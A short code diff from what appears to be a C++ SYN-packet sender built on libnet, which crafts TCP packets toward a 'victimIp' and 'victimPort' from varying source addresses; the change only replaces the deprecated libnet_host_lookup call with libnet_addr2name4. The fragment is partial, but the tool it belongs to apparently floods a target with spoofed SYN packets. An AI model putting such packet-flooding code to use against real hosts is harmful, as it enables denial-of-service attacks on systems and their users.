@@ -41,7 +41,7 @@ void* senderThread(void *arg)
 	int wait 		= targ->wait;
 	int v			= targ->verbose;
 	u_long victimIp	= targ->victimIp;
-	string victimIpStr = (char*)libnet_host_lookup(victimIp, 0);
+	string victimIpStr = (char*)libnet_addr2name4(victimIp, 0);
 	int victimPort	= targ->victimPort;
 	int requestType = targ->requestType;
 	int threadId 	= targ->threadId;
@@ -64,7 +64,7 @@ void* senderThread(void *arg)
 		cout << "Error while getting local IP address: " << error << endl;
 		pthread_exit(NULL);
 	}
-	localIpStr = (char*)libnet_host_lookup(localIp, 0);
+	localIpStr = (char*)libnet_addr2name4(localIp, 0);
 
 	// Initialize the generic packet
     int packet_size = LIBNET_IP_H + LIBNET_TCP_H; // no payload
@@ -135,7 +135,7 @@ void* senderThread(void *arg)
     		if (libnet_write_ip(network, packet, packet_size) < packet_size) {
        			libnet_error(LN_ERR_WARNING, (char*)"libnet_write_ip only wrote less then %d bytes\n", packet_size);
     		}
-			if(v)cout << "Sent SYN packet to " << victimIpStr << " from " << libnet_host_lookup(sourceIp, 0) << endl;
+			if(v)cout << "Sent SYN packet to " << victimIpStr << " from " << libnet_addr2name4(sourceIp, 0) << endl;
 
 			//add the new connection to map
 			ConnInfo coninfo;
